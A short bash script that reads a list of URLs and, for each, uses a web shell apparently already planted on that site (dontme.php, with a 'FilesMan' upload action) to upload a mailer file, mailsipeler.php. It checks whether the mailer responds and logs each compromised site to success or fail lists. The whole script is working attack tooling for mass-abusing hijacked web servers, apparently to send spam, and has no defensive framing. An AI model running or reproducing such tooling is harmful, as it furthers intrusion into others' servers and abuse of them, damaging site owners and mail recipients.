#!/bin/bash
p=$1
sed -i 's/\r//' $0 
sed -i 's/\r//' $1

upload(){
	xx=`curl -s -k ${URL}/dontme.php | grep -Po '(?<=name=c value=)[^"]*(/)' | grep -Po "(?<='/)[^'>]*" | head -1`
	pp=`curl -s -F 'a=FilesMan' -F "c=/${xx}" -F 'p1=uploadFile' -F "f=@mailsipeler.php" ${URL}/dontme.php`
	cek=`curl -s -k "${URL}/mailsipeler.php"`
	if [[ $cek =~ 'sukses' ]];
	then
		echo "${URL} - MAIL SUCCESS SEND"
		echo "${URL}/dontme.php">>succes.txt
	else
		echo "${URL} - MAIL FAILED SEND"
		echo "${URL}/dontme.php">>fail.txt
	fi
}

for URL in `cat $p`; do
	upload ${URL}
done
